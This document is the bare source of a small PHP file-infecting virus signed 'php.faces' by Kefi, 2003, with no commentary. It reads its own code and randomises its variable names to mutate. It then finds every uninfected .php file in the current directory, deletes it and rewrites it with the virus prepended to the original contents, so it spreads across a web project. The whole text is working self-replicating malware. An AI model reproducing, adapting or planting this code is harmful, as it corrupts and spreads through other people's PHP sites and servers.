<?php
 $ypxqrpsqcc = fopen(__FILE__, "r");
 $bbugesqpty = substr(fread($ypxqrpsqcc, filesize(__FILE__)), 0, 1249);
 fclose($ypxqrpsqcc);
 $dhbpgxtamn = array("ypxqrpsqcc", "bbugesqpty", "dhbpgxtamn", "cctsvcopcx", "wurwejtvjx",
 "ccznwozuuo", "uudxleoyja", "ionwdbkwfh", "zohqscoxob", "skzmabzbfe");
 for($cctsvcopcx = 0; $cctsvcopcx < count($dhbpgxtamn); $cctsvcopcx++){
  $wurwejtvjx = chr(rand(97, 122));
  for($ccznwozuuo = 0; $ccznwozuuo < 9; $ccznwozuuo++)  $wurwejtvjx = $wurwejtvjx . chr(rand(97, 122));
  $bbugesqpty = str_replace("$dhbpgxtamn[$cctsvcopcx]", "$wurwejtvjx", "$bbugesqpty");
 }
 $uudxleoyja = opendir(".");
 while(false !== ($ionwdbkwfh = readdir($uudxleoyja))){
  if($ionwdbkwfh != "." && $ionwdbkwfh != ".."){
   if(substr($ionwdbkwfh, -3) == "php"){
    $zohqscoxob = fopen($ionwdbkwfh, "r"); 
     $skzmabzbfe = substr(fread($zohqscoxob, filesize($ionwdbkwfh)), 5);
    fclose($zohqscoxob);
    if(!strstr($skzmabzbfe, "php.faces")){
     unlink("$ionwdbkwfh");
     $zohqscoxob = fopen($ionwdbkwfh, "a+"); 
     fwrite($zohqscoxob, "$bbugesqpty");
     fwrite($zohqscoxob, "$skzmabzbfe");
     fclose($zohqscoxob);
    }
   }
  }
 }
 closedir($uudxleoyja);
 // php.faces  (c) by Kefi, 2003
?>